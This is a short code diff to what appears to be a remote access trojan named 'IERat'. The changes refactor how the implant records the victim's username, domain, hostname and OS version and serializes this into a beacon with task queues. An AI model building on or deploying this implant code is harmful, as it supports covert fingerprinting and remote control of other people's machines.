@@ -17,7 +17,7 @@ namespace IERat
             Username = Environment.UserName;
             Domain = Environment.UserDomainName;
             Hostname = Environment.MachineName;
-            OSVersion = Environment.OSVersion.Version.ToString();
+            OSVersion = Environment.OSVersion.ToString();
             AgentTasks = new Queue<TaskObject>();
             CompletedAgentTasks = new Queue<TaskObject>();
             Version = "free";
@@ -35,8 +35,7 @@ namespace IERat
 
         public string GenerateBeacon()
         {
-            JavaScriptSerializer js = new JavaScriptSerializer();
-            return js.Serialize(this);
+            return new JavaScriptSerializer().Serialize(this);
         }
         public void ExecuteTasks()
         {
